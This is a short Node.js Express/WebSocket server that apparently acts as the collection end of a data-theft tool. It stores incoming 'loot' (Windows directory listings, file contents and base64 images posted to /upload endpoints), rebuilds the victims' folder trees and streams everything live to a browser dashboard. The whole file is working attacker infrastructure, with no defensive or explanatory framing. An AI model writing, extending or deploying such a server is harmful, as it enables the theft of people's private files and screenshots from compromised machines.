const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(express.text({ limit: '50mb' }));
app.use(express.json());
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));


const loot = {
  directories: {},
  files: [],
  images: []
};

function broadcast(type, data) {
  wss.clients.forEach((client) => {
    client.send(JSON.stringify({ type, data }));
  });
}


function addPathToTree(tree, filePath) {
  const parts = filePath.trim().split('\\');
  let current = tree;
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i];
    if (i === parts.length - 1 && part.includes('.')) {
      current[part] = null;
    } else {
      if (!current[part]) current[part] = {};
      current = current[part];
    }
  }
}

app.post('/upload/dirs', (req, res) => {
  const lines = req.body.split('\n');
  lines.forEach(line => {
    if (line.trim()) addPathToTree(loot.directories, line); // When .split('\n') happens, sometime sthere is trailing white space, this basically says if
  }); // when you trim the string, the string is empty, skip it. Else do the addPathToTree
  broadcast('dirs', loot.directories);
  res.sendStatus(200);
});

app.post('/upload/files', (req, res) => {
  console.log(req.body);
  broadcast('files', req.body)
  res.sendStatus(200);
});

app.post('/upload/image', (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const base64 = req.body.substring(firstNewline + 1);
  console.log('Image received:', path);
  broadcast('image', { path, base64 });
  res.sendStatus(200);
});

app.get('/api/loot', (req, res) => {
  res.json(loot);
});

wss.on('connection', (ws) => {
  console.log('Browser connected');
  ws.send(JSON.stringify({ type: 'init', data: loot }));
});

server.listen(8080, () => console.log('Listening on 8080'));